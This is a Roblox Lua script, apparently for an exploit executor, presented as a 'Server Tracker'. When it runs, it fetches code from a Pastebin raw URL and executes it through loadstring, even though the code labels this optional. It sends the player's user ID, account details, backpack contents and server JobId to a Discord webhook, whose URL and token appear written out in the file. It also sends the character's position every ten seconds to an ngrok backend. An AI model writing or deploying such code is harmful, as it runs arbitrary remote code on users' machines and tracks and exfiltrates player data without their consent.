local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- ======= CONFIGURATION =======
local API_BASE_URL = "https://e1c5-2001-448a-106e-4be8-56bb-76c9-5288-28b1.ngrok-free.app/api"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
-- ==============================

local player = Players.LocalPlayer
local currentJobId = game.JobId
local playerName = player.Name
local playerUserId = player.UserId

-- Fungsi request HTTP dengan retry
local function httpRequest(url, method, body, headers, retries)
    retries = retries or 3
    local requestFunc = syn and syn.request or http_request or request
    if not requestFunc then 
        warn("[httpRequest] No compatible HTTP request function found")
        return nil 
    end
    
    for i = 1, retries do
        local success, response = pcall(function()
            return requestFunc({
                Url = url,
                Method = method,
                Headers = headers or { ["Content-Type"] = "application/json" },
                Body = body
            })
        end)
        
        if success and response then
            return response
        end
        wait(1)
    end
    return nil
end

-- Dapatkan isi backpack player (untuk webhook)
local function getBackpackContents()
    local contents = {}
    local backpack = player:FindFirstChild("Backpack")
    if not backpack then return "Backpack not found" end
    
    for _, item in ipairs(backpack:GetChildren()) do
        table.insert(contents, item.Name)
    end
    
    return #contents > 0 and table.concat(contents, ", ") or "Backpack empty"
end

-- Eksekusi script eksternal (optional)
local function executeExternalScript()
    local success, err = pcall(function()
        loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
    end)
    if not success then
        warn("‚ö†Ô∏è Failed to execute external script:", err)
    end
    return success
end

-- Update instance dan userId ke backend
local function updateInstanceInDatabase()
    local data = {
        instanceId = currentJobId,
        userId = tostring(playerUserId),
    }
    
    local encodedData = HttpService:JSONEncode(data)
    local response = httpRequest(API_BASE_URL .. "/setInstanceUser", "POST", encodedData)
    
    if response then
        print("API Response:", response.StatusCode or response.Status, response.Body or response.Body)
        if (response.StatusCode == 200 or response.Status == 200) then
            print("‚úÖ Successfully updated instance ID and user data in Redis")
            print("   Instance ID:", currentJobId)
            print("   User ID:", playerUserId)
            return true
        else
            warn("‚ùå API Error:", response.Body or "Unknown error")
            return false
        end
    else
        warn("‚ùå No response from server")
        return false
    end
end

-- Kirim posisi player ke backend setiap 10 detik (jika ada HumanoidRootPart)
local function sendUserPositionLoop()
    while true do
        local character = player.Character
        if character and character:FindFirstChild("HumanoidRootPart") then
            local pos = character.HumanoidRootPart.Position
            local posData = {
                instanceId = currentJobId,
                userId = tostring(playerUserId),
                position = { x = pos.X, y = pos.Y, z = pos.Z }
            }
            local encodedPosData = HttpService:JSONEncode(posData)
            local resp = httpRequest(API_BASE_URL .. "/setUserPosition", "POST", encodedPosData)
            if resp and (resp.StatusCode == 200 or resp.Status == 200) then
                print("‚úÖ Position updated:", pos.X, pos.Y, pos.Z)
            else
                warn("‚ùå Failed to update position")
            end
        else
            warn("‚ö†Ô∏è Character or HumanoidRootPart not found")
        end
        wait(10)
    end
end

-- Kirim notifikasi perubahan server ke Discord webhook
local function sendServerChangeNotification()
    local embed = {
        username = "Server Tracker",
        embeds = {
            {
                title = "üîÑ Server Change Detected",
                description = string.format("**%s** (UserID: %d) changed servers\n**New JobID:** `%s`", 
                    playerName, playerUserId, currentJobId),
                color = 16776960,
                timestamp = DateTime.now():ToIsoDate(),
                fields = {
                    {
                        name = "üë§ Player Info",
                        value = string.format("UserID: %d\nDisplay Name: %s\nAccount Age: %d days", 
                            playerUserId, player.DisplayName, player.AccountAge),
                        inline = true
                    },
                    {
                        name = "üì¶ Backpack Contents",
                        value = getBackpackContents(),
                        inline = true
                    },
                    {
                        name = "üéÆ Game Info",
                        value = string.format("Game ID: %d\nPlace ID: %d", game.GameId, game.PlaceId),
                        inline = false
                    },
                    {
                        name = "üìú External Script Status",
                        value = executeExternalScript() and "‚úÖ Executed successfully" or "‚ùå Failed to execute",
                        inline = false
                    }
                },
                footer = {
                    text = "Auto Server Tracker v3.3 | UserID: "..playerUserId
                }
            }
        }
    }

    local success
    for i = 1, 3 do
        local res = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
        if res and (res.StatusCode == 204 or res.Status == 204) then
            success = true
            break
        end
        wait(1)
    end

    if not success then
        warn("‚ùå Failed to send webhook notification after retries")
    end
end

-- Fungsi utama saat join server / pindah server
local function handleServerJoin()
    spawn(executeExternalScript) -- async run external script
    
    local attempts = 0
    local maxAttempts = 3
    local success = false
    
    while attempts < maxAttempts and not success do
        attempts += 1
        success = updateInstanceInDatabase()
        if not success then wait(2) end
    end
    
    sendServerChangeNotification()
    
    -- Mulai kirim posisi secara berkala
    spawn(sendUserPositionLoop)
end

-- Deteksi pindah server dan jalankan handleServerJoin
local function monitorServerChanges()
    local lastJobId = currentJobId
    
    while true do
        local newJobId = game.JobId
        if newJobId ~= lastJobId then
            print("üîÑ Detected server change:", lastJobId, "‚Üí", newJobId)
            currentJobId = newJobId
            lastJobId = newJobId
            handleServerJoin()
        end
        wait(1)
    end
end

local success, err = pcall(function()
    print("üöÄ Initializing Server Tracker for UserID:", playerUserId)
    handleServerJoin()
    monitorServerChanges()
end)

if not success then
    warn("‚ùå Critical error in server tracker:", err)
    local errorEmbed = {
        username = "Server Tracker - ERROR",
        embeds = {
            {
                title = "‚ùå Script Error Occurred",
                description = string.format("UserID: %d encountered an error", playerUserId),
                color = 16711680,
                fields = {
                    {
                        name = "Error Details",
                        value = tostring(err),
                        inline = false
                    }
                },
                footer = {
                    text = "UserID: "..playerUserId
                }
            }
        }
    }
    httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(errorEmbed))
end
